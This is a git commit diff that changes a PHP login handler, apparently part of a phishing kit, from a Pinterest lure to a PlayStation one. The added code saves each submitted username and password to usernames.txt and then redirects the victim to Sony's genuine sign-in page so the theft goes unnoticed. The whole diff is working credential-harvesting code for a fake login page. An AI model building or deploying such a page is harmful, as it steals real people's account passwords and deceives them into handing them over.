bd80708352dc8524dbec7173adba8e0d02c08e48
yash <yashvyavahare02@gmail.com>
2023-06-12 00:08:48 +0530

    Updated playstation page

--- .server/www/login.php
+++ .server/www/login.php
@@ -1,5 +1,6 @@
 <?php
-file_put_contents("usernames.txt", "Pinterest Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.pinterest.com/password/reset/');
+
+file_put_contents("usernames.txt", "Playstation Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://id.sonyentertainmentnetwork.com/signin/?#/signin?entry=%2Fsignin/');
 exit();
 ?>
